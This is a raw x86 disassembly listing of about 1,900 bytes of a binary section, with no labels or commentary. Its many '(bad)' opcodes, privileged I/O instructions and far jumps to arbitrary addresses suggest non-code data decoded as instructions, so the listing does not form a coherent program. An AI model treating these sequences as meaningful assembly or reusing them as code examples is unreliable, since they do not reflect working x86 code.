  41377d:	ins    BYTE PTR es:[edi],dx
  41377e:	or     DWORD PTR [ecx+0x23],ebx
  413781:	retf   0x73e7
  413784:	cwde   
  413785:	aaa    
  413786:	cwde   
  413787:	idiv   DWORD PTR [esp+edx*2-0x2acbef3d]
  41378e:	(bad)  
  41378f:	and    ebx,DWORD PTR [edx+0x172d61dc]
  413795:	add    DWORD PTR [ebp-0x62c982cd],edi
  41379b:	popa   
  41379c:	fadd   DWORD PTR [edi-0x5077ec95]
  4137a2:	nop
  4137a3:	scas   al,BYTE PTR es:[edi]
  4137a4:	xor    al,0x80
  4137a6:	cwde   
  4137a7:	lods   al,BYTE PTR ds:[esi]
  4137a8:	fsubr  DWORD PTR [edx+0x35c30ff4]
  4137ae:	cmp    edi,DWORD PTR [eax]
  4137b0:	shl    BYTE PTR [eax],1
  4137b2:	cmp    DWORD PTR [edx],esp
  4137b4:	sub    eax,0xfd30189d
  4137b9:	cdq    
  4137ba:	mov    al,0xd7
  4137bc:	push   edi
  4137bd:	jge    0x41379f
  4137bf:	cmp    al,0x57
  4137c1:	pusha  
  4137c2:	push   esi
  4137c3:	sub    ah,BYTE PTR [eax-0x437b86a0]
  4137c9:	div    ebx
  4137cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137cc:	push   esi
  4137cd:	sub    cl,BYTE PTR [ebp-0x700a8643]
  4137d3:	dec    ebp
  4137d4:	jbe    0x413811
  4137d6:	inc    esp
  4137d7:	sub    al,0xc5
  4137d9:	mov    esi,0x20326c8c
  4137de:	adc    al,0x3
  4137e0:	test   al,0x99
  4137e2:	mov    dh,0x1a
  4137e4:	test   eax,0xdf8749cc
  4137e9:	les    eax,FWORD PTR [edx]
  4137eb:	fwait
  4137ec:	ins    DWORD PTR es:[edi],dx
  4137ed:	(bad)  
  4137ee:	jle    0x4137fd
  4137f0:	lahf   
  4137f1:	test   al,0xdc
  4137f3:	retf   
  4137f4:	xor    eax,0xa7cabdd6
  4137f9:	jns    0x4137de
  4137fb:	bsr    ebp,DWORD PTR [ebx+0x1d]
  4137ff:	add    eax,0xcc5a1f56
  413804:	outs   dx,BYTE PTR ds:[esi]
  413805:	dec    esi
  413806:	push   ds
  413807:	js     0x413828
  413809:	dec    ebp
  41380a:	in     eax,0x15
  41380c:	jae    0x4137bf
  41380e:	not    ebx
  413810:	lock sbb esp,DWORD PTR ds:0xa403f391
  413817:	call   0xf786:0xd3c58d0c
  41381e:	shl    ebx,0x42
  413821:	cli    
  413822:	lock or eax,0x1f091100
  413828:	xchg   edi,eax
  413829:	pop    edx
  41382a:	fiadd  WORD PTR [edx-0x6e5887da]
  413830:	es (bad) 
  413832:	mov    edx,0xb44a2de3
  413837:	aam    0x6c
  413839:	xor    eax,0x87095c89
  41383e:	fisttp WORD PTR [ebx+ebp*8]
  413841:	xchg   edi,eax
  413842:	les    eax,FWORD PTR [eax]
  413844:	xchg   dh,al
  413846:	hlt    
  413847:	dec    edi
  413848:	push   esi
  413849:	cwde   
  41384a:	pop    ecx
  41384b:	mov    al,ds:0x5621ae81
  413850:	sbb    al,0xe7
  413852:	pop    ds
  413853:	in     al,dx
  413854:	stos   BYTE PTR es:[edi],al
  413855:	aaa    
  413856:	mov    bl,0x3b
  413858:	(bad)  
  413859:	sbb    eax,DWORD PTR ds:0x5f04b6c6
  41385f:	xchg   edx,eax
  413860:	pop    ebp
  413861:	jl     0x413823
  413863:	mov    ecx,0x56dbe6bc
  413868:	push   0xfba68042
  41386d:	jge    0x41385c
  41386f:	mov    esp,0xfde55d53
  413874:	popf   
  413875:	stos   DWORD PTR es:[edi],eax
  413876:	fwait
  413877:	pop    esi
  413879:	jno    0x413803
  41387b:	imul   ecx,DWORD PTR es:[edi+esi*4+0x7a610d2],0x5
  413884:	test   eax,0xeee75cfb
  413889:	call   FWORD PTR ds:0xd2ab6977
  41388f:	popa   
  413890:	scas   eax,DWORD PTR es:[edi]
  413891:	cmc    
  413892:	mov    esi,0xd882c10
  413897:	xor    esi,edx
  413899:	mov    bl,0x9
  41389b:	dec    edx
  41389c:	and    al,0x74
  41389e:	stos   DWORD PTR es:[edi],eax
  41389f:	outs   dx,BYTE PTR ds:[esi]
  4138a0:	lahf   
  4138a1:	stc    
  4138a2:	jb     0x41388f
  4138a4:	je     0x413923
  4138a6:	mov    WORD PTR [edx-0x45902b80],gs
  4138ac:	fiadd  WORD PTR [esi]
  4138ae:	scas   eax,DWORD PTR es:[edi]
  4138af:	and    BYTE PTR [ebp+0x2072fc77],bl
  4138b5:	mov    al,ds:0xffc7868f
  4138ba:	or     eax,0x33590a9c
  4138bf:	xchg   edx,eax
  4138c0:	push   ecx
  4138c1:	xor    bl,bh
  4138c3:	and    bl,BYTE PTR [ebp-0x25]
  4138c6:	cli    
  4138c7:	dec    ecx
  4138c8:	repnz outs dx,BYTE PTR ds:[esi]
  4138ca:	iret   
  4138cb:	shl    DWORD PTR [esi],cl
  4138cd:	(bad)  
  4138ce:	in     al,dx
  4138cf:	jle    0x4138c2
  4138d1:	es push 0x68
  4138d4:	enter  0x1c6b,0x49
  4138d8:	(bad)  
  4138d9:	push   esi
  4138da:	mov    dh,BYTE PTR [ebp+0x22]
  4138dd:	scas   eax,DWORD PTR es:[edi]
  4138de:	rcr    BYTE PTR [ebp+ecx*1+0x4700a9d],0x59
  4138e6:	mov    dl,0xbe
  4138e8:	in     al,0x9b
  4138ea:	add    al,0xaa
  4138ec:	enter  0xdf16,0xba
  4138f0:	xchg   edx,eax
  4138f1:	clc    
  4138f2:	jle    0x4138ed
  4138f4:	scas   al,BYTE PTR es:[edi]
  4138f5:	jno    0x41395e
  4138f7:	adc    al,0x9c
  4138f9:	add    al,0x5e
  4138fb:	mov    esp,gs
  4138fd:	inc    eax
  4138fe:	jmp    0x6a6a:0x7d47330b
  413905:	mov    esi,0xefad1c7f
  41390a:	bound  ebp,QWORD PTR [ecx-0x86930e9]
  413910:	popa   
  413911:	and    al,BYTE PTR [edi-0x70]
  413914:	in     eax,0x83
  413916:	pop    es
  413917:	repz add DWORD PTR [esi+esi*4-0x1b3229fc],ebx
  41391f:	(bad)  
  413921:	or     eax,0x5aa6be5c
  413926:	add    al,0x92
  413928:	ja     0x413998
  41392a:	daa    
  41392b:	mov    eax,0xf33d7d93
  413930:	xor    edx,DWORD PTR [eax]
  413932:	iret   
  413933:	je     0x413989
  413935:	sbb    DWORD PTR [edx-0x4c520c67],edx
  41393b:	in     eax,dx
  41393c:	pop    esi
  41393d:	add    ecx,eax
  41393f:	jo     0x41393f
  413941:	pop    es
  413942:	adc    eax,0x5efd8571
  413947:	push   0x87bb6e05
  41394c:	xor    eax,0xf61855c4
  413951:	leave  
  413952:	sbb    al,0x7a
  413954:	add    DWORD PTR [ebx],edx
  413956:	inc    edi
  413957:	sub    bh,BYTE PTR [edx]
  413959:	scas   eax,DWORD PTR es:[edi]
  41395a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41395b:	fs dec bp
  41395e:	inc    edi
  41395f:	out    0xaf,eax
  413961:	ret    
  413962:	xchg   ebx,eax
  413963:	add    BYTE PTR [eax+0x3e],bl
  413966:	pop    ebp
  413967:	xor    eax,0x4872cd2a
  41396c:	call   0x3cc9:0xd45e637b
  413973:	xchg   esp,eax
  413974:	pop    ecx
  413975:	mov    ebx,0xd9095435
  41397a:	shl    DWORD PTR [edx+esi*8+0x76d388f3],0xd7
  413982:	rcl    esi,1
  413984:	in     eax,dx
  413985:	sbb    eax,0x53f36dd9
  41398a:	adc    eax,0xee8c211f
  41398f:	xor    eax,DWORD PTR [eax+edi*1]
  413992:	stos   DWORD PTR es:[edi],eax
  413993:	jg     0x413931
  413995:	stos   BYTE PTR es:[edi],al
  413996:	sbb    DWORD PTR [edx+0x3b208766],edi
  41399c:	mov    eax,0x97493d0d
  4139a1:	inc    esi
  4139a2:	jecxz  0x413926
  4139a4:	sub    DWORD PTR [eax],0xffffffa0
  4139a7:	add    ecx,DWORD PTR [eax+0x3cb12dbd]
  4139ad:	rcl    BYTE PTR [ecx+0x3f8dfd24],cl
  4139b3:	(bad)  
  4139b4:	mov    ecx,0xfbf6a058
  4139b9:	test   edi,0xc48e8165
  4139bf:	inc    edi
  4139c0:	dec    esp
  4139c1:	add    edi,DWORD PTR [edi+0x1020cc37]
  4139c7:	mov    ds:0x28f9b9ba,al
  4139cc:	ss scas al,BYTE PTR es:[edi]
  4139ce:	jp     0x4139d1
  4139d0:	pop    ebx
  4139d1:	push   ds
  4139d2:	lods   al,BYTE PTR ds:[esi]
  4139d3:	call   0xc275d74a
  4139d8:	sub    DWORD PTR [eax-0x30aa2e46],ebp
  4139de:	leave  
  4139df:	push   edi
  4139e0:	jbe    0x413a04
  4139e2:	jns    0x41398e
  4139e4:	inc    edi
  4139e5:	daa    
  4139e6:	out    0x51,eax
  4139e8:	add    eax,0x815bdf86
  4139ed:	xor    eax,0x4fb5ae03
  4139f2:	sar    DWORD PTR [ebx-0x37],1
  4139f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f6:	out    0x14,eax
  4139f8:	lock popa 
  4139fa:	call   0xdd9bb0d5
  4139ff:	shr    DWORD PTR [edi+eax*1],cl
  413a02:	pop    eax
  413a03:	push   cs
  413a04:	mov    eax,ds:0x67cf256b
  413a09:	outs   dx,DWORD PTR ds:[esi]
  413a0a:	mov    ebp,tr5
  413a0d:	lahf   
  413a0e:	fcmovnbe st,st(5)
  413a10:	adc    BYTE PTR [edi+0x3c632643],0xee
  413a17:	xchg   esi,eax
  413a18:	call   0x8ebc31b4
  413a1d:	(bad)  
  413a1e:	cmp    dh,bh
  413a20:	sbb    edi,edx
  413a22:	cli    
  413a23:	or     eax,0xd4f88870
  413a28:	inc    edi
  413a29:	cld    
  413a2a:	loope  0x4139bc
  413a2c:	(bad)  
  413a2e:	sbb    eax,0xb63179cb
  413a33:	addr16 (bad) 
  413a35:	sub    al,0x93
  413a37:	sbb    BYTE PTR ds:0x50d655a9,al
  413a3d:	sbb    al,0xcb
  413a3f:	and    DWORD PTR [eax+0x49567f91],edi
  413a45:	dec    edi
  413a46:	xchg   edi,eax
  413a47:	push   edi
  413a48:	pusha  
  413a49:	jmp    0xf61844dd
  413a4e:	iret   
  413a4f:	or     ah,BYTE PTR [eax+0x787a6e45]
  413a55:	or     bl,0x22
  413a58:	pop    ecx
  413a59:	mov    eax,0xc2a75b01
  413a5e:	fs test eax,0x81782558
  413a64:	dec    ecx
  413a65:	test   al,0x3f
  413a67:	xchg   ecx,eax
  413a68:	dec    ebx
  413a69:	aam    0xe5
  413a6b:	ror    BYTE PTR [ebx+ebx*4+0x7b1674e5],cl
  413a72:	and    bh,BYTE PTR [ebp+0x31c28e2e]
  413a78:	scas   eax,DWORD PTR es:[edi]
  413a79:	aad    0x62
  413a7b:	mov    esi,0x82b18d02
  413a80:	or     eax,esp
  413a82:	gs es enter 0x620d,0x7b
  413a88:	(bad)  
  413a8a:	pop    ss
  413a8b:	pushf  
  413a8c:	xchg   ebx,eax
  413a8d:	sbb    BYTE PTR [esi],ah
  413a8f:	cmp    DWORD PTR [edi+0x62b87fde],0x1f
  413a96:	add    BYTE PTR [esi+0x1f590e13],0x88
  413a9d:	shl    bl,0xd5
  413aa0:	pushf  
  413aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aa2:	sar    edi,cl
  413aa4:	aam    0x0
  413aa6:	mov    bh,BYTE PTR [ebp-0x7b]
  413aa9:	dec    ebp
  413aaa:	xor    al,0xc2
  413aac:	pop    esp
  413aad:	fs push 0x878d6bf8
  413ab3:	popf   
  413ab4:	add    dl,dl
  413ab6:	es enter 0x2a5e,0xfd
  413abb:	outs   dx,DWORD PTR ds:[esi]
  413abc:	add    DWORD PTR [esi-0x4dcf496d],ebp
  413ac2:	sub    DWORD PTR [edx-0x750ad5f3],0x4e
  413ac9:	push   ecx
  413aca:	lods   eax,DWORD PTR ds:[esi]
  413acb:	fst    DWORD PTR [ebp+edi*4+0x4d60efbf]
  413ad2:	fwait
  413ad3:	gs clc 
  413ad5:	sub    bh,BYTE PTR [esi]
  413ad7:	jmp    DWORD PTR [ecx+0xdd788e2]
  413add:	and    eax,DWORD PTR [eax+0x39]
  413ae0:	cmp    al,0x1a
  413ae2:	and    esi,ecx
  413ae4:	jb     0x413a88
  413ae6:	jb     0x413ae0
  413ae8:	xchg   ecx,eax
  413ae9:	jo     0x413af8
  413aeb:	sub    dh,BYTE PTR [ebp-0x50]
  413aee:	sub    al,0x68
  413af0:	sbb    al,ah
  413af2:	or     DWORD PTR [edx+ebp*2+0x7c62defb],eax
  413af9:	mov    esi,0xaf0c9f68
  413afe:	mov    BYTE PTR [eiz*1+0x27192681],bl
  413b05:	lahf   
  413b06:	addr16 inc ebx
  413b08:	xchg   esi,eax
  413b09:	push   eax
  413b0a:	xor    esp,DWORD PTR [eax]
  413b0c:	cmp    ch,al
  413b0e:	pop    ebp
  413b0f:	jne    0x413b64
  413b11:	mov    bl,0x28
  413b13:	jl     0x413b4f
  413b15:	xor    eax,0xa7aabe42
  413b1a:	and    edi,DWORD PTR [edi]
  413b1c:	inc    ebp
  413b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b1e:	and    ebx,DWORD PTR [ecx+0x5b]
  413b21:	jno    0x413b4f
  413b23:	inc    esp
  413b24:	jbe    0x413adb
  413b26:	cmp    BYTE PTR [eax+0x4e],dl
  413b29:	inc    ecx
  413b2a:	push   ecx
  413b2b:	or     eax,DWORD PTR [ebp-0x68]
  413b2e:	and    ah,BYTE PTR [edi+ecx*1]
  413b31:	xchg   ebp,ecx
  413b33:	push   cs
  413b34:	pop    ss
  413b35:	daa    
  413b36:	jo     0x413b44
  413b38:	div    al
  413b3a:	adc    ch,BYTE PTR [edx]
  413b3c:	jmp    0xc475c892
  413b41:	dec    esi
  413b42:	outs   dx,BYTE PTR ds:[esi]
  413b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b44:	lods   eax,DWORD PTR ds:[esi]
  413b45:	(bad)  
  413b46:	adc    eax,DWORD PTR [edx-0x41]
  413b49:	jg     0x413b4f
  413b4b:	repz inc ebp
  413b4d:	add    esi,eax
  413b4f:	mov    dl,0xf6
  413b51:	dec    esp
  413b52:	retf   
  413b53:	jmp    0x3458:0x93aaa647
  413b5a:	and    BYTE PTR [edx+0x18],bl
  413b5d:	(bad)  
  413b5e:	in     eax,0x98
  413b60:	pop    ds
  413b61:	xchg   ebx,edx
  413b63:	pop    ds
  413b64:	pop    ebp
  413b65:	into   
  413b66:	sbb    DWORD PTR [ecx-0x1822f366],edi
  413b6c:	mov    al,ds:0xf8ab645d
  413b71:	clc    
  413b72:	(bad)  
  413b73:	std    
  413b74:	popf   
  413b75:	arpl   WORD PTR [edx-0x55c8abe8],sp
  413b7b:	hlt    
  413b7c:	adc    BYTE PTR [ebx],dh
  413b7e:	pop    esi
  413b7f:	dec    eax
  413b80:	xchg   ebp,eax
  413b81:	sbb    ecx,DWORD PTR [edi+0x4498b868]
  413b87:	and    bl,BYTE PTR [esi+eax*8]
  413b8a:	inc    ebx
  413b8b:	icebp  
  413b8c:	in     al,dx
  413b8d:	fcomi  st,st(3)
  413b8f:	add    al,0x28
  413b91:	lods   eax,DWORD PTR ds:[esi]
  413b92:	adc    DWORD PTR ds:0xac41e999,ebp
  413b98:	outs   dx,BYTE PTR ds:[esi]
  413b99:	xor    BYTE PTR [eax+ebx*8-0x34],dl
  413b9d:	in     al,0x46
  413b9f:	or     eax,0xe060fa4b
  413ba4:	sbb    al,0xed
  413ba6:	or     edx,DWORD PTR [eax]
  413ba8:	pop    eax
  413ba9:	mov    BYTE PTR [edx+eiz*8],bh
  413bac:	mov    bl,0x58
  413bae:	test   al,0xca
  413bb0:	xchg   BYTE PTR [ebx],bl
  413bb2:	fst    DWORD PTR [edx+0x7fd1d14c]
  413bb8:	add    edx,DWORD PTR [eax+ebx*1+0x48]
  413bbc:	push   ebp
  413bbd:	lds    ebx,FWORD PTR ds:0xbed27c0e
  413bc3:	inc    esp
  413bc4:	inc    ecx
  413bc5:	mov    cl,0x7d
  413bc7:	jbe    0x413b50
  413bc9:	fs jnp 0x413baa
  413bcc:	inc    ecx
  413bcd:	stc    
  413bce:	push   edx
  413bcf:	dec    esp
  413bd0:	fimul  DWORD PTR [ebx]
  413bd2:	xor    bl,BYTE PTR [ebx]
  413bd4:	jg     0x413beb
  413bd6:	xor    al,0xae
  413bd8:	mov    esi,0xc9d8c250
  413bdd:	das    
  413bde:	sbb    eax,0x6af9f23c
  413be3:	push   edi
  413be4:	ror    BYTE PTR [esi+0x2bc6961b],cl
  413bea:	test   BYTE PTR [eax],al
  413bec:	mov    fs,WORD PTR [ebp+0x6c]
  413bef:	xchg   ebp,eax
  413bf0:	out    0x75,eax
  413bf2:	outs   dx,DWORD PTR ds:[esi]
  413bf3:	mov    ah,0x96
  413bf5:	stos   BYTE PTR es:[edi],al
  413bf6:	out    0xab,eax
  413bf8:	dec    edi
  413bf9:	jp     0x413bd4
  413bfb:	sub    al,0x88
  413bfd:	mov    ebx,0x94024581
  413c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c03:	loope  0x413c66
  413c05:	dec    eax
  413c06:	mov    bl,0x69
  413c08:	inc    edi
  413c09:	dec    ebx
  413c0a:	xchg   ebx,eax
  413c0b:	xor    al,0x82
  413c0d:	je     0x413bf3
  413c0f:	xor    DWORD PTR [eax-0x5c],ebp
  413c12:	pop    ecx
  413c13:	nop
  413c14:	mov    ch,0x1d
  413c16:	add    cl,BYTE PTR [ecx-0x13bc870]
  413c1c:	sub    esp,DWORD PTR [edx]
  413c1e:	fild   DWORD PTR [ecx-0x78891613]
  413c24:	mov    al,ds:0x2ea8ee06
  413c29:	mov    al,BYTE PTR ds:0x70c99bce
  413c2f:	jbe    0x413be5
  413c31:	sub    DWORD PTR [ebx],0x10
  413c34:	fwait
  413c35:	leave  
  413c36:	call   0x3d0991ef
  413c3b:	sub    BYTE PTR [eax+edx*8],al
  413c3e:	pop    es
  413c3f:	popf   
  413c40:	jp     0x413c52
  413c42:	stc    
  413c43:	cmc    
  413c44:	call   0xf398a6a9
  413c49:	mov    bh,0x1a
  413c4b:	stos   BYTE PTR es:[edi],al
  413c4c:	pop    ebx
  413c4d:	mov    esi,edi
  413c4f:	mov    DWORD PTR [ebp-0x31],edx
  413c52:	jmp    0xe78f:0xe5371230
  413c59:	mov    dh,0xa8
  413c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c5c:	(bad)  
  413c5d:	and    ebx,DWORD PTR [ecx]
  413c5f:	lock jmp 0x2a7f:0xa1c3865f
  413c67:	add    ch,BYTE PTR [eax]
  413c69:	and    BYTE PTR [esi],al
  413c6b:	cmp    eax,0xaef2dffb
  413c70:	aaa    
  413c71:	aaa    
  413c72:	(bad)  
  413c73:	pop    esp
  413c74:	dec    esi
  413c75:	(bad)  
  413c77:	mov    ds:0xf5a7a9df,al
  413c7c:	pop    edi
  413c7d:	pop    ss
  413c7e:	fst    DWORD PTR [ecx-0x4cc947e1]
  413c84:	aad    0x5e
  413c86:	jbe    0x413cff
  413c88:	push   ds
  413c89:	mov    BYTE PTR [esi],dl
  413c8b:	into   
  413c8c:	in     al,0x8f
  413c8e:	fistp  QWORD PTR [ecx]
  413c90:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c92:	fistp  DWORD PTR [ecx-0x53]
  413c95:	pop    edi
  413c96:	arpl   WORD PTR [edx],si
  413c98:	mov    ecx,0xfecdd46c
  413c9d:	jge    0x413ce7
  413c9f:	and    BYTE PTR [esi],bh
  413ca1:	retf   
  413ca2:	je     0x413cb1
  413ca4:	xor    edi,eax
  413ca6:	jae    0x413ce7
  413ca8:	ins    BYTE PTR es:[edi],dx
  413ca9:	sub    eax,0x298513fd
  413cae:	mov    dh,0xd1
  413cb0:	in     al,0x62
  413cb2:	and    eax,0x8fad0cf9
  413cb7:	add    al,0x0
  413cb9:	ins    DWORD PTR es:[edi],dx
  413cba:	out    0x4e,eax
  413cbc:	outs   dx,BYTE PTR ds:[esi]
  413cbd:	cs sahf 
  413cbf:	adc    ah,BYTE PTR [ecx+eiz*1+0x610b5af7]
  413cc6:	test   eax,0xcb6659f8
  413ccb:	(bad)  
  413ccc:	ror    DWORD PTR [edx],cl
  413cce:	imul   DWORD PTR ds:0xf80f56fe
  413cd4:	mov    dh,0xa5
  413cd6:	sub    esi,edi
  413cd8:	push   ecx
  413cd9:	mov    dl,BYTE PTR [esi+0x1b]
  413cdc:	daa    
  413cdd:	ret    0x96de
  413ce0:	sar    edx,1
  413ce2:	stos   DWORD PTR es:[edi],eax
  413ce3:	xchg   ebp,eax
  413ce4:	xchg   esi,eax
  413ce5:	aam    0x14
  413ce7:	pop    es
  413ce8:	addr16 jmp 0x413d14
  413ceb:	call   0x4c8:0xa62d0bde
  413cf2:	int    0x85
  413cf4:	loopne 0x413cf8
  413cf6:	pop    ebp
  413cf7:	jo     0x413d60
  413cf9:	bound  ebx,QWORD PTR [eax]
  413cfb:	adc    esi,DWORD PTR [ecx+ecx*1-0x60d5e031]
  413d02:	add    BYTE PTR [esi-0x6],dl
  413d05:	jo     0x413d54
  413d07:	xchg   DWORD PTR [ebp+0x1509d6c4],ebp
  413d0d:	int    0x47
  413d0f:	sbb    DWORD PTR [edx-0x5f],edi
  413d12:	push   ebx
  413d13:	jecxz  0x413d65
  413d15:	dec    edx
  413d16:	mov    dl,0x24
  413d18:	fsubr  QWORD PTR [edx]
  413d1a:	sub    al,BYTE PTR [esi]
  413d1c:	adc    esi,DWORD PTR [ecx+0x39]
  413d1f:	hlt    
  413d20:	pop    edi
  413d21:	imul   ebx,DWORD PTR [eax],0x28709cbd
  413d27:	pop    ecx
  413d28:	dec    edi
  413d29:	jle    0x413cab
  413d2b:	xchg   cl,cl
  413d2d:	inc    esp
  413d2e:	hlt    
  413d2f:	sub    dh,ah
  413d31:	pop    esp
  413d32:	in     al,dx
  413d33:	push   0x2
  413d35:	dec    ebp
  413d36:	push   ds
  413d37:	icebp  
  413d38:	in     eax,dx
  413d39:	add    eax,0xbe6f00d5
  413d3e:	sahf   
  413d3f:	dec    esi
  413d40:	inc    ecx
  413d41:	jnp    0x413cf6
  413d43:	fwait
  413d44:	xchg   BYTE PTR [ecx-0x252b3524],al
  413d4a:	ficomp DWORD PTR [ebx-0x130de076]
  413d50:	mov    esp,DWORD PTR [edi+0x2]
  413d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d54:	mov    eax,ds:0x5f3207a3
  413d59:	jnp    0x413d42
  413d5b:	mov    ebx,0x3a8e6b1d
  413d60:	aaa    
  413d61:	push   edi
  413d62:	xor    eax,0x1bb85470
  413d67:	pop    ecx
  413d68:	jp     0x413db0
  413d6a:	(bad)  
  413d6b:	popf   
  413d6c:	loope  0x413d2c
  413d6e:	add    ecx,DWORD PTR cs:[eax+0x4d884a3b]
  413d75:	sub    bh,BYTE PTR [eax-0x42fb6653]
  413d7b:	aaa    
  413d7c:	repnz call FWORD PTR [ebx-0x68]
  413d80:	mov    fs,WORD PTR [ebp-0x80]
  413d83:	xchg   esp,eax
  413d84:	pop    ebx
  413d85:	scas   eax,DWORD PTR es:[edi]
  413d86:	xor    cl,BYTE PTR [esi]
  413d88:	sbb    WORD PTR [edi],si
  413d8b:	jge    0x413dcb
  413d8d:	sub    eax,0xb080a9c
  413d92:	xchg   esi,eax
  413d93:	(bad)  
  413d94:	leave  
  413d95:	int    0x8c
  413d97:	mov    ebx,DWORD PTR [ebp-0x40]
  413d9a:	ds addr16 out dx,eax
  413d9d:	and    DWORD PTR [ecx-0x707fcfb3],ecx
  413da3:	imul   esp,esp,0x82ce4e57
  413da9:	(bad)  
  413daa:	fcomi  st,st(3)
  413dac:	xor    BYTE PTR [edx+0x40271169],ch
  413db2:	std    
  413db3:	shl    DWORD PTR [esi+ecx*8-0x77],cl
  413db7:	adc    DWORD PTR [edx],esi
  413db9:	repnz inc ecx
  413dbb:	xor    al,BYTE PTR [edi-0x29]
  413dbe:	icebp  
  413dbf:	or     al,cl
  413dc1:	ds fs push edi
  413dc4:	jg     0x413d66
  413dc6:	dec    ebx
  413dc7:	jnp    0x413dbf
  413dc9:	pmullw mm6,mm0
  413dcc:	xor    BYTE PTR [eax],bh
  413dce:	and    cl,BYTE PTR [edx+0x394cbe00]
  413dd4:	(bad)  
  413dd5:	outs   dx,DWORD PTR ds:[esi]
  413dd6:	mov    ecx,0x82386c1b
  413ddb:	push   ss
  413ddc:	cmp    cl,ah
  413dde:	popf   
  413ddf:	mov    DWORD PTR [ecx+0x340ca4a9],ecx
  413de5:	rol    DWORD PTR [ebx+0x6e],cl
  413de8:	inc    edi
  413de9:	gs push ebx
  413deb:	outs   dx,BYTE PTR ds:[esi]
  413dec:	jno    0x413e4d
  413dee:	push   esp
  413def:	add    eax,0xab9a7771
  413df4:	rcr    DWORD PTR ds:0xc7ae691c,0xeb
  413dfb:	xchg   BYTE PTR [edi-0x78366f2f],bh
  413e01:	nop
  413e02:	or     ah,BYTE PTR [esi]
  413e04:	or     BYTE PTR [edx],ch
  413e06:	mov    ebx,0x84f97a6c
  413e0b:	add    dh,BYTE PTR [ecx-0x4c]
  413e0e:	add    BYTE PTR [esi+0x193ea311],ch
  413e14:	lock push esp
  413e16:	pop    es
  413e17:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e19:	mov    eax,0xe4eb8910
  413e1e:	xchg   ecx,eax
  413e1f:	sub    eax,0x369abd19
  413e24:	jmp    0xf01546d4
  413e29:	cmp    al,0xf8
  413e2b:	outs   dx,DWORD PTR ds:[esi]
  413e2c:	inc    ebp
  413e2d:	lds    ecx,FWORD PTR [eax+0x38]
  413e30:	in     al,dx
  413e31:	push   0xf9dbd8f7
  413e36:	rcl    DWORD PTR [ebx],0x0
  413e39:	jge    0x413e10
  413e3b:	mov    ebp,0x5e99bf80
  413e40:	enter  0x9a02,0x88
  413e44:	push   ebx
  413e45:	cmp    edx,DWORD PTR [esi+0x79c267ce]
  413e4b:	imul   esi,ecx,0xf68a6961
  413e51:	add    DWORD PTR [ecx-0x5],edi
  413e54:	les    esi,FWORD PTR [eax]
  413e56:	cmp    eax,0x524bbb17
  413e5b:	inc    edi
  413e5c:	mov    ebx,0xcdf735c8
  413e61:	mov    ecx,0x21c8f510
  413e66:	out    dx,al
  413e67:	inc    BYTE PTR ds:0x3cd79f91
  413e6d:	mov    ds:0xebdcba2f,al
  413e72:	fs jb  0x413ed5
  413e75:	scas   al,BYTE PTR es:[edi]
  413e76:	push   esp
  413e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e78:	xchg   esp,eax
  413e79:	aaa    
  413e7a:	cwde   
  413e7b:	or     bl,bl
  413e7d:	lods   eax,DWORD PTR ds:[esi]
  413e7e:	pop    edi
  413e7f:	out    dx,al
  413e80:	jns    0x413e55
  413e82:	xchg   edx,eax
  413e83:	(bad)  
  413e84:	cli    
  413e85:	add    DWORD PTR [esi-0x369f5790],esi
  413e8b:	adc    esp,DWORD PTR [ebx-0xecaa007]
  413e91:	xchg   edi,eax
  413e92:	inc    ecx
  413e93:	add    esp,eax
  413e95:	gs test al,0xba
  413e98:	jecxz  0x413eff
  413e9a:	fistp  DWORD PTR [edi]
  413e9c:	add    DWORD PTR [edi+0x10b51c4c],0x7b1cc3c7
  413ea6:	das    
  413ea7:	adc    eax,DWORD PTR es:[ecx-0x57]
  413eab:	fs jae 0x413ea1
  413eae:	or     esp,DWORD PTR ds:0x8c6837ba
  413eb4:	xlat   BYTE PTR ds:[ebx]
  413eb5:	leave  
  413eb6:	stc    
  413eb7:	test   DWORD PTR [edx-0x4013e68c],0x1fee3e33
  413ec1:	test   cl,dl
  413ec3:	pop    ebx
  413ec4:	sub    BYTE PTR [ecx-0xed820fb],0xc8
  413ecb:	adc    BYTE PTR [edx],cl
  413ecd:	pop    es
  413ece:	push   ecx
  413ecf:	sbb    bl,BYTE PTR [edx-0x7c8dc883]
  413ed5:	sbb    al,0x8a
  413ed7:	inc    ebx
  413ed8:	cmp    BYTE PTR [ecx],0x16
  413edb:	add    al,0x87
  413edd:	cdq    
  413ede:	cs data16 mov bh,0x8e
  413ee2:	fcmovnbe st,st(3)
  413ee4:	pop    ebx
  413ee5:	lahf   
  413ee6:	dec    eax
  413ee7:	test   BYTE PTR [ebp-0x4847dc3e],dl
  413eed:	mov    edi,0x9da5a073
  413ef2:	xchg   BYTE PTR [esi],bl
  413ef4:	sbb    BYTE PTR [esi],0x74
  413ef7:	mov    ch,0x60
  413ef9:	xor    BYTE PTR [esi-0x615c0c83],cl
  413eff:	pop    edi
  413f00:	ins    BYTE PTR es:[edi],dx
  413f01:	pop    esp
  413f02:	push   0x64
  413f04:	loop   0x413ea8
  413f06:	cwde   
  413f07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f08:	jns    0x413f27
  413f0a:	lods   al,BYTE PTR ds:[esi]
  413f0b:	dec    edx
  413f0c:	cmp    eax,ebx
  413f0e:	jg     0x413ee7
  413f10:	loope  0x413ef1
  413f12:	pop    ebx
  413f13:	dec    ebx
  413f14:	xlat   BYTE PTR ds:[ebx]
  413f15:	aam    0xc3
  413f17:	xor    eax,0x162ab1d3
  413f1c:	mul    bh
  413f1e:	sbb    esp,ebx
  413f20:	xlat   BYTE PTR ds:[ebx]
  413f21:	aam    0xc4
  413f23:	sbb    al,0xf2
  413f25:	mov    bl,0x7c
  413f27:	dec    esp
  413f28:	or     dh,BYTE PTR [esi]
  413f2a:	sub    eax,0x54a497a7
